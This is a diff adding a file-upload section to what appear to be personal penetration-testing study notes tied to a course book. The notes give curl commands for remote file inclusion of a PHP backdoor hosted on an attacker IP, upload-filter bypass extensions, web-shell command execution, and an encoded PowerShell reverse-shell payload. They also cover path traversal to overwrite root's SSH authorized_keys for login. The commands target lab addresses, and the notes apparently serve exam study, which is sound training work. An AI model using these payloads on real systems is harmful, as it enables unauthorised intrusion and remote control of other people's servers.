@@ -48,3 +48,18 @@ To automate the process, use the following tools
 - RFI using simple-backdoor.php
 -     curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simplebackdoor.php&cmd=ls"
 
+-----------------------------------------------------------------File Upload-------------------------------------------------------------------------
+- if the PHP files are blacklisted you can try the following file extensions [phps, php7, phtml]
+- also check to play with lower/upper caps example .pHP
+- if you used simple-backdoor.php. you need to use cmd for the execution
+-     curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=dir
+- obtaining a reverse shell on Windows (book page number 271)
+-     curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20AYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
+- if you can't execute the uploaded file. you can try to overwrite the authorized key file in the home directory and connect to SSH with the private key (book page number 275)
+-     ssh-keygen 
+-     cat <file.pub> authorized_keys
+- upload the file in the following path
+-     ../../../../../../../root/.ssh/authorized_keys
+- before connecting to the SSH delete know_hosts file
+-     rm ~/.ssh/know_hosts
+-     ssh -p <port> -i <file> root@10.0.2.10
